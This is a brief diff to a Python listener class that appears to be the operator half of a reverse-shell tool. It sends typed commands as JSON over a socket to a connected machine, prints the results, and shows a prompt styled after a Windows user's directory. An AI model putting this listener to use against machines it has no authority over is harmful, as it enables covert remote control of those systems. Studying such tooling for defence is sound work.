@@ -16,12 +16,12 @@ class SocketListener:
     #Sending Input
     def json_send(self,data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.connection.send(json_data)
 
     # Process Input
     def json_receive(self):
         json_data = self.connection.recv(1024)
-        return json.loads(json_data.decode())
+        return json.loads(json_data)
 
     # Getting Input
     def command_execution(self,command_input):
@@ -30,7 +30,7 @@ class SocketListener:
 
     def start_listener(self):
         while True:
-            command_input = raw_input("root@Windows/User: ")
+            command_input = raw_input("Windows C:\\User\\IEUser\\> ")
             command_output = self.command_execution(command_input)
             print(command_output)
 
